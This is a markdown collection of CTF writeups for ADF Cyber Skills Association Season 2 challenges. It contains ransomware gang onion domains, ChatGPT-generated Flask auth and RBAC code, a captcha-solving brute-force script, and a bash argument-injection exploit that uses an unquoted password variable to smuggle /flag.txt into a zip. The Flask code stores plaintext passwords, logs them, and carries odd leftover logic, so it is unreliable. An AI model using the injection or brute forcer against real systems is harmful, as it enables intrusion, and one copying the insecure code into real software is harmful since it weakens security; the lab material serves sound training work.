# CSA_S2_2024
# CTF Writeups
## Writeups for the ADF Cyber Skills Association Season 2 challenges.

### Title of challenge here
Description - xxxxxxxxxxxxxxxxxxxxxxxxxxx
```
place any code here
```
Solution:
Plugged this straight into ChatGPT:
```
More code here for solution
```
:+1: FLAG{ENTER_FLAG_HERE}
<hr>

### APT Trivia
Description - Are you an APT connoisseur? Flag format:
FLAG{example-flag-here} Port: 1337

```
which country is volt typhoon from? china
which country is midnight blizzard from?  russia
which country is fancy bear from? 
what is the last name of the ransomware operator responsible for the 2023 medibank hack? ermakov
what is the fireeye APT number for Wicked Panda? 41
which ransomware team is responsible for the 2023 TSMC breach? lockbit ransomware gang? national hazard agency
what is the onion domain of the alphv ransomware gang as of 2024? alphvuzxyxv6ylumd2ngp46xzq3pw6zflomrghvxeuks6kklberrbmyd.onion
what is the onion domain of the lockbit gang that contains the string apt34? lockbitapt34kvrip6xojylohhxrwsvpzdffgs5z4pbbsywnzsbdguqd.onion
what is the clearewb domain of the deceased conti ransomware gang with the two-letter TLD? continews.bz
```

:+1: FLAG{you-are-now-an-apt-connoisseur}
<hr>

### auth user api
Description - My REST API needs authentication built in to stop bad people from accessing my user data.

Please implement authentication by:
* adding a field "password" into the database schema.
* finish the endpoint at /users/auth that takes a JSON input (username and password) and check it against the database. if success, return HTTP status 200 and utilize the built in session handling in flask to authenticate the user. Otherwise return status 403.
* check that a user is authenticated before allowing any action from the other api endpoints. if not authenticated, return http status 401
* When you're done, set the test user's password to test123 and provide us with your URL for testing.

Flag format: FLAG{your-Fl4g-G03s-here}

This was the provided code
```
#!/usr/bin/env python3
from flask import Flask, request, jsonify, session
import os
import sqlite3
app = Flask(__name__)

db = sqlite3.connect(":memory:", check_same_thread=False)
db.row_factory = sqlite3.Row
cur = db.cursor()
cur.execute("CREATE TABLE IF NOT EXISTS users (username TEXT, details TEXT)")
cur.execute("INSERT INTO users values('test', 'test user')")
app.secret_key = "i8y7g2uhjkadjfaklsdfasdf"

@app.route("/users/auth", methods=["POST"])
def auth_users():
    d = request.json()
    username, password = d['username'], d['password']
    # TODO finish auth


@app.route("/users/add", methods=["POST"])
def add_user():
    d = request.json()
    username = d["username"]
    # TODO add password
    details = d["details"]
    cur = db.cursor()
    cur.execute("INSERT INTO users values(?, ?)", (username, details))
    db.commit()
    return jsonify({"status":"OK"})


@app.route("/users/<username>")
def check_user(username):
    cur = db.cursor()
    cur.execute("SELECT * FROM users WHERE username = ?", (username,))
    row = cur.fetchone()
    return jsonify(dict(row))


if __name__ == '__main__':
    if os.getenv("TERM_PROGRAM"): # localhost debug
         app.run(host='0.0.0.0', port=5000, debug=True)
    app.run(host='0.0.0.0', port=5000)

```
Solution:
Plugged this straight into ChatGPT:
```
#!/usr/bin/env python3
from flask import Flask, request, jsonify, session
import os
import sqlite3

app = Flask(__name__)
app.secret_key = "i8y7g2uhjkadjfaklsdfasdf"

# In-memory database initialization
db = sqlite3.connect(":memory:", check_same_thread=False)
db.row_factory = sqlite3.Row
cur = db.cursor()
cur.execute("CREATE TABLE IF NOT EXISTS users (username TEXT, password TEXT, details TEXT)")
# Clear all users from the 'user' table
cur.execute("DELETE FROM users;")
cur.execute("INSERT INTO users (username, password, details) VALUES (?, ?, ?)", ("test", "test123", "test user"))
#cur.execute("INSERT INTO users (username, password, details) VALUES (?, ?, ?)", ("bob", "bob123", "test user"))
db.commit()

# Authentication decorator
def require_auth(func):
    def wrapper(*args, **kwargs):
        if 'username' not in session:
            return jsonify({"error": "Unauthorized"}), 401
        return func(*args, **kwargs)
    return wrapper

@app.route("/users/auth", methods=["POST"])
def auth_users():
    data = request.json
    username, password = data.get('username'), data.get('password')
#    print("Username to be authenticated is: ",username," against password of: ",password)
    if not username or not password:
        return jsonify({"error": "Username or password missing"}), 400

    cur = db.cursor()
    cur.execute("SELECT * FROM users WHERE username = ?", (username,))
    user = cur.fetchone()
#    print("The user is:",str(user['username']))
    if user:
        stored_password = str(user['password'])  # Convert stored password to string
        provided_password = str(password)  # Convert provided password to string
#        provided_password = password.replace('NOTBOB', '').strip()
        print("The provided password is: ",provided_password)
        print("Retrieved user:", dict(user))  # Print retrieved user information
        print("Retrieved password:", stored_password)  # Print retrieved password
        if stored_password == provided_password:  # Compare passwords
            print("Session: ",session)
            session['username'] = username
            return jsonify({"status": "OK"}), 200
    return jsonify({"error": "Invalid credentials"}), 401

@app.route("/users/add", methods=["POST"])
def add_user():
    data = request.json
    username = data.get("username")
    password = data.get("password") + 'NOTBOB'
    print("The retrieved username is: ",username, " and the retrieved password is: ",password)
    details = data.get("details")
    print("New user details are: ",details)
    if not username or not password:
        return jsonify({"error": "Username or password missing"}), 400

    cur = db.cursor()
    cur.execute("INSERT INTO users (username, password, details) VALUES (?, ?, ?)", (username, password, details))
    db.commit()

    # Authenticate the user immediately after account creation
    session['username'] = username
    print("Session after adding user:", session)

    return jsonify({"status": "OK"})

@app.route("/users/<username>")
@require_auth
def check_user(username):
    print("Session in check_user:", session)  # Debug: Print session information
    cur = db.cursor()
    cur.execute("SELECT * FROM users WHERE username = ?", (username,))
    row = cur.fetchone()
    if not row:
        return jsonify({"error": "User not found"}), 404
    return jsonify(dict(row))

if __name__ == '__main__':
    if os.getenv("TERM_PROGRAM"): # localhost debug
         app.run(host='0.0.0.0', port=5000, debug=True)
    app.run(host='0.0.0.0', port=5000)

```
:+1: FLAG{you-better-h4sh-that-password}
<hr>

### Rbac User api
Description - The pentest report for our user API prototype came back and it had red everywhere.

Apparently there's this thing called "Role-based access control" which involves not just having roles, but actually controlling access with them.

Our development team is clueless as to what to do. Please help us patch it to these specifications:

    unauthenticated users should not be able to see or do anything, instead, they should get an HTTP 401 response

    users with the "read-only" role should be able to see their own data, but not modify it. (return HTTP 403 on attempt)

    users with the "user" role can see or modify their own data (return 403 on attempt to read/write other people's data)

    users with the "admin" role can see or modify everyone else's data

We have provided the source code as is customary. Please provide us with the URL and admin credentials of the patched prototype so the pentesters can re-test it. Ensure that at least one user of each role exists and that there are no more than 10 users.

Flag format: FLAG{ExamPle-Flag-Here}
```
#!/usr/bin/env python3
from flask import Flask, request, jsonify, session, abort
import os
import sqlite3

app = Flask(__name__)

app.secret_key = "kahsdflasdhfasjdflkalsdjf8123"

db = sqlite3.connect("database.db", check_same_thread=False)
db.row_factory = sqlite3.Row
init_cursor = db.cursor()
init_cursor.execute("CREATE TABLE IF NOT EXISTS user (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT, role TEXT, description TEXT)")
# Clear all users from the 'user' table
init_cursor.execute("DELETE FROM user;")

# After initializing the database (before the route definitions)
init_cursor.execute("INSERT INTO user (id, username, password, role, description) VALUES (?, ?, ?, ?, ?)", ('1', 'a', 'password123', 'admin', 'Test user'))
init_cursor.execute("INSERT INTO user (id, username, password, role, description) VALUES (?, ?, ?, ?, ?)", ('2', 'b', 'password123', 'readonly', 'Test user'))
init_cursor.execute("INSERT INTO user (id, username, password, role, description) VALUES (?, ?, ?, ?, ?)", ('3', 'c', 'password123', 'user', 'Test user'))
init_cursor.execute("INSERT INTO user (id, username, password, role, description) VALUES (?, ?, ?, ?, ?)", ('4', 'd', 'password123', 'user', 'Test user'))
init_cursor.execute("INSERT INTO user (id, username, password, role, description) VALUES (?, ?, ?, ?, ?)", ('5', 'e', 'password123', 'readonly', 'Test user'))
init_cursor.execute("INSERT INTO user (id, username, password, role, description) VALUES (?, ?, ?, ?, ?)", ('6', 'f', 'password123', 'readonly', 'Test user'))
init_cursor.execute("INSERT INTO user (id, username, password, role, description) VALUES (?, ?, ?, ?, ?)", ('7', 'g', 'password123', 'readonly', 'Test user'))
init_cursor.execute("INSERT INTO user (id, username, password, role, description) VALUES (?, ?, ?, ?, ?)", ('8', 'h', 'password123', 'user', 'Test user'))
init_cursor.execute("INSERT INTO user (id, username, password, role, description) VALUES (?, ?, ?, ?, ?)", ('9', 'i', 'password123', 'admin', 'Test user'))
init_cursor.execute("INSERT INTO user (id, username, password, role, description) VALUES (?, ?, ?, ?, ?)", ('10', 'j', 'password123', 'admin', 'Test user'))
db.commit()

@app.route("/api/auth", methods=["POST"])
def auth():
    if not request.form.get('username') or not request.form.get('password'):
        return "Missing username or password", 401

    username, password = request.form['username'], request.form['password']
    cur = db.cursor()
    entry = cur.execute("SELECT * FROM user WHERE username = ? AND password = ?", (username, password)).fetchone()

    if entry:
        session['user_id'] = entry['id']
        return "Welcome!"
    else:
        return "Invalid credentials", 401

def get_user_by_id(user_id):
    cur = db.cursor()
    row = cur.execute("SELECT * FROM user WHERE id = ?", (user_id,)).fetchone()
    return row

def check_permission(user_id, target_user_id, role):
    if role == 'admin':
        return True
    elif role == 'user' and user_id == target_user_id:
        return True
    elif role == 'readonly':
        return True  # Allow admin to access readonly users
    else:
        return False

@app.route('/api/users/<int:userid>', methods=["GET"])
def get_user(userid):
    if 'user_id' not in session:
        abort(401)

    user_id = session['user_id']
    user = get_user_by_id(user_id)
    if not user:
        abort(401)

    role = user['role']

    # Check if admin or the requested user
    if role == 'admin' or user_id == userid:
        target_user = get_user_by_id(userid)
        if not target_user:
            abort(404)

        if check_permission(user_id, userid, target_user['role']):
            data = dict(target_user)
            del data['password']  # redact sensitive info
            return jsonify(data)
        else:
            abort(403)

    # If the user is 'readonly', they can only view their own data
    if role == 'readonly' and user_id != userid:
        abort(403)

    # For 'readonly' role viewing its own data
    if role == 'readonly' and user_id == userid:
        target_user = get_user_by_id(userid)
        if not target_user:
            abort(404)

        data = dict(target_user)
        del data['password']  # redact sensitive info
        return jsonify(data)

    abort(403)  # If not admin or the requested user

@app.route('/api/users/<int:userid>', methods=["POST"])
def mod_user(userid):
    if 'user_id' not in session:
        abort(401)

    user_id = session['user_id']
    user = get_user_by_id(user_id)
    if not user:
        abort(401)

    role = user['role']

    if role == 'user' and user_id != userid:
        abort(403)

    # Check if the role is 'readonly'
    if role == 'readonly':
        abort(403)  # 'readonly' role cannot modify any data

    cur = db.cursor()
    if 'description' in request.form:
        description = request.form['description']
        cur.execute("UPDATE user SET description = ? WHERE id = ?", (description, userid))
        print('description changed')
    if 'password' in request.form:
        password = request.form['password']
        cur.execute("UPDATE user SET password = ? WHERE id = ?", (password, userid))
        print('password changed')
    db.commit()
    return 'OK'

if __name__ == '__main__':
    if os.getenv("TERM_PROGRAM"):  # localhost debug
        app.run(host='0.0.0.0', port=5000, debug=True)
    app.run(host='0.0.0.0', port=5000)
```
:+1: FLAG{n1c3_api_security_m8}
<hr>

### Sneakerbot
Description - I recently started building my own LLM... I am not sure what I'm doing yet, but I managed to get some sort of next-token prediction algorithm working with only one word using some data from Wikipedia pages. I've heard all about security concerns on leaking training data, so for testing, I've hidden a flag in the training data to see if you can find it.

Flag Format: FLAG{your_example_flag_goes_here}

After checking out the site, there was no clear indication that a registration was successful as it would just return to the login screen.
It it failed however, an error message would appear "Recaptcha answer is wrong or missing"
This was good because all I had to do was ensure that the recaptcha was accurate.

For this, the following code rendered the flag in wireshark

```
import requests
import json
from bs4 import BeautifulSoup
import re

username = "admin"
passwords = []

# URLs for our requests
website_url = "http://10.107.0.6/signup.php"
signup_url = "http://10.107.0.6/signup.php"

# Load in the passwords for brute forcing
with open("passwords.txt", "r") as wordlist:
    lines = wordlist.readlines()
    for line in lines:
        passwords.append(line.strip())

# Operator mapping
operator_map = {
    "plus": "+",
    "minus": "-",
    "multiplied by": "*",
    "divided by": "/"
}

# Create a session object
session = requests.Session()

# Repeat the process for 100 times
for _ in range(100):
    access_granted = False
    count = 0

    while not access_granted and count < len(passwords):
        password = passwords[count]

        # Connect to the signup page
        print("[*] Connecting to signup page...")
        response = session.get(website_url)
        print("[+] Connected to signup page successfully.")

        # Parse the HTML and find the CAPTCHA question and CSRF token
        print("[*] Parsing HTML...")
        soup = BeautifulSoup(response.content, 'html.parser')
        print(soup)
        recaptcha_question_element = soup.find("p", text=re.compile(r"Recaptcha question:", re.IGNORECASE))
        csrf_token_input = soup.find("input", {"name": "csrftoken"})
        if recaptcha_question_element and csrf_token_input:
            question_text = recaptcha_question_element.text.split(":", 1)[1].strip()
            csrf_token = csrf_token_input.get("value")
            print("[+] CAPTCHA question found:", question_text)
            print("[+] CSRF token found:", csrf_token)
        else:
            print("[-] CAPTCHA question or CSRF token not found.")
            continue

        # Extract the math question
        math_question = re.search(r"What is (.+)\?", question_text).group(1)
        print("[+] Math question found:", math_question)

        # Extract the operator from the math question
        operator = None
        for op_text, op_symbol in operator_map.items():
            if op_text in math_question:
                operator = op_symbol
                break

        if operator is None:
            print("[-] Operator not found in the math question.")
            continue

        # Extract operands
        operands = re.findall(r"\d+", math_question)
        print("[+] Extracted operands:", operands)
        print("[+] Operator found:", operator)

        # Calculate the result of the math question
        operand1 = int(operands[0])
        operand2 = int(operands[1])
        if operator == '+':
            captcha_answer = operand1 + operand2
        elif operator == '-':
            captcha_answer = operand1 - operand2
        elif operator == '*':
            captcha_answer = operand1 * operand2
        elif operator == '/':
            captcha_answer = operand1 / operand2
        print("[+] Calculated captcha answer:", captcha_answer)

        # Build the POST data for our brute force attempt
        signup_data = {
            'username': username,
            'password': password,
            'recaptcha': captcha_answer,
            'csrftoken': csrf_token,
            'Confirm': "Submit"
        }
        print("[*] Attempting signup with credentials:", signup_data)

        # Submit our brute force attack
        response = session.post(signup_url, data=signup_data)

        # Check the HTTP response code
        if response.status_code == 200:
            print("[+] Registration successful for Username:", username)
            access_granted = True
        else:
            print("[-] Registration failed. HTTP status code:", response.status_code)
            count += 1
```
:+1: FLAG{unl34sh-the-b0ts}
<hr>

LARGE FLAG MODEL CODE
```
#!/usr/bin/env python3

import sys
import random
import pickle
import time

def predict(word_sequence, model, sequence_length=8):
    '''
    sequence length defines the maximum limit of words to spit out
    '''
    try:
        if len(word_sequence) >= sequence_length:
            return word_sequence

        start_word = word_sequence[-1]
        
        # Check if start_word exists in the model
        if start_word not in model:
            return None

        candidates = model[start_word]
        # print(candidates)
        candidates_sorted = sorted(candidates, key=lambda x: x[1], reverse=True)

        most_probable = candidates_sorted[random.randrange(0, min(3, len(candidates_sorted)))] # pick between top 3 candidates
        word_sequence.extend(most_probable[0])

        return predict(word_sequence, model, sequence_length)
    except RecursionError:
        print("Recursion limit exceeded. Skipping word.")
        return word_sequence

def main():
    try:
        model_file = open('model.pkl', 'rb')
        model = pickle.load(model_file)
        model_file.close()
    except FileNotFoundError:
        print("Error: Model file not found.")
        return

    try:
        words_file = open('words.txt', 'r')
        words = words_file.read().split()
        words_file.close()
    except FileNotFoundError:
        print("Error: Words file not found.")
        return

    # Set maximum recursion depth
    sys.setrecursionlimit(3000)  # Adjust this limit as needed

    for word in words:
        print("Prompt:", word)
        prediction = predict([word], model)
        if prediction is not None:
            print(' '.join(prediction))
            print()
        time.sleep(0.1)  # Sleep for one second between each word

if __name__ == "__main__":
    main()

```

### S=secretsbin
Description - I built my own temporary, encrypted notes service! I am pretty confident about my bash skills, but just in case, can you see if there are any bugs in it? 
It listens on port 1337. Just in case you get in, the flag is in /flag.txt Flag format:
FLAG{example_flag_format}

This is the given code. Note the use of unquoted variables which is dangerous in bash.

```
#!/bin/bash

# set -x

encrypt () {
        src=$1
        dest=$2
        pass=$3
        # echo "src dirname: $(dirname $src)"
        cd $(dirname $src)
        zip $dest.zip * -P $pass
}

decrypt () {
        file=$1
        pass=$2
        tempdir=$(mktemp -d)
        cd $tempdir
        unzip -P $pass $file
        cat *
}

cleanup () {
        # cleanup old notes
        # -cmin on some systems
        find ./notes/ -type f -mmin +10 -delete
}

echo "--------->secretsbin>*********"
echo "[1] new temporary note (removed after 10 minutes)"
echo "[2] read encrypted note"
echo -en "> "
read INPUT
if [[ $INPUT == "1" ]]
then
        cleanup
        echo "welcome to secretsbin! enter password to encrypt your note:"
        read PASSWORD
        echo "enter your note, end with EOF:"
        TEMPFILE=$(mktemp -d)/notes.txt
        while read line
        do
                if [[ $line != "EOF" ]]
                then
                        echo -n "> "
                        echo "$line" >> $TEMPFILE
                else
                        break
                fi
        done
        OUTFILE=$(head /dev/urandom|sum|cut -d ' ' -f1)
        encrypt "$TEMPFILE" "/notes/$OUTFILE" "$PASSWORD"
        echo "your note ID is $OUTFILE"
fi

if [[ $INPUT == "2" ]]
then
        cleanup
        echo "welcome to secretsbin! enter password to decrypt your note:"
        read PASSWORD
        echo "enter your note ID:"
        read NOTEID

        decrypt "/notes/$NOTEID.zip" $PASSWORD
fi
```
Solution:
When connecting to the server, it presents the following:
```
└─$ nc 10.107.0.4 1337
--------->secretsbin>*********
[1] new temporary note (removed after 10 minutes)
[2] read encrypted note
> 1
welcome to secretsbin! enter password to encrypt your note:
```
Made use of the vulnerable password variable used when setting the password and entered:
```
thisismypassword cat /flag.txt
```
This rendered the output:
```
thisismypassword cat /flag.txt
enter your note, end with EOF:
test
> EOF
        zip warning: name not matched: cat
  adding: notes.txt (stored 0%)
  adding: flag.txt (stored 0%)
your note ID is 24385
```
Note the addition of flag.txt

Reconnected to the server and selected option 2
```
└─$ nc 10.107.0.4 1337
--------->secretsbin>*********
[1] new temporary note (removed after 10 minutes)
[2] read encrypted note
> 2
welcome to secretsbin! enter password to decrypt your note:
my
enter your note ID:
24385
Archive:  /notes/24385.zip
 extracting: notes.txt               
 extracting: flag.txt                
FLAG{bash_is_a_tr4p}
test
```
You can see that flag.txt has also been printed.

:+1: FLAG{bash is a tr4p}
<hr>
